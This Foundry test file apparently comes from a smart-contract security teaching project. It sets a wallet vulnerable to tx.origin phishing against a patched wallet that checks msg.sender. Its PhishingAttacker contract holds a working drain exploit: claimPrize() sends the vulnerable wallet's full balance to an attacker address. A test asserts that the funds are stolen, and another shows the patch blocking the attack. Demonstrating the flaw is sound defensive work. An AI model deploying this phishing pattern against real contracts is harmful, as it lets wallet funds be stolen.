// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/tx_origin/VulnerableWallet.sol";
import "../src/tx_origin/PatchedWallet.sol";

contract PhishingAttacker {
    VulnerableWallet public vulnerableWallet;
    PatchedWallet public patchedWallet;
    address payable public attackerRecipient;

    constructor(address payable _vulnerableWallet, address payable _patchedWallet, address payable _attacker) {
        vulnerableWallet = VulnerableWallet(_vulnerableWallet);
        patchedWallet = PatchedWallet(_patchedWallet);
        attackerRecipient = _attacker;
    }

    /// @notice Phishing entrypoint: Owner is tricked into calling this function
    function claimPrize() external {
        // Intermediary contract calls the wallet
        // tx.origin is the victim owner!
        vulnerableWallet.transfer(attackerRecipient, address(vulnerableWallet).balance);
    }

    function attackPatched() external {
        // Patched wallet checks msg.sender, which is this contract (not owner)
        patchedWallet.transfer(attackerRecipient, address(patchedWallet).balance);
    }
}

contract TxOriginTest is Test {
    VulnerableWallet public vulnerableWallet;
    PatchedWallet public patchedWallet;
    PhishingAttacker public phishingContract;

    address public owner = address(0xCAFE);
    address payable public attacker = payable(address(0xBAD));

    function setUp() public {
        vm.deal(owner, 20 ether);
        vm.prank(owner);
        vulnerableWallet = new VulnerableWallet{value: 10 ether}();

        vm.prank(owner);
        patchedWallet = new PatchedWallet{value: 10 ether}();

        phishingContract = new PhishingAttacker(
            payable(address(vulnerableWallet)),
            payable(address(patchedWallet)),
            attacker
        );
    }

    function testExploitTxOriginPhishing() public {
        emit log_named_uint("Wallet Balance Before Phishing", address(vulnerableWallet).balance);

        // Owner falls for phishing and calls claimPrize()
        vm.prank(owner, owner); // msg.sender = owner, tx.origin = owner
        phishingContract.claimPrize();

        emit log_named_uint("Wallet Balance After Phishing", address(vulnerableWallet).balance);
        emit log_named_uint("Attacker Balance After Phishing", attacker.balance);

        assertEq(address(vulnerableWallet).balance, 0, "Wallet drained via tx.origin spoofing");
        assertEq(attacker.balance, 10 ether, "Attacker acquired stolen funds");
    }

    function testPatchedWalletPreventsPhishing() public {
        // Owner tries calling attackPatched()
        vm.prank(owner, owner);
        vm.expectRevert();
        phishingContract.attackPatched();

        assertEq(address(patchedWallet).balance, 10 ether, "Patched wallet funds remain untouched");
    }
}
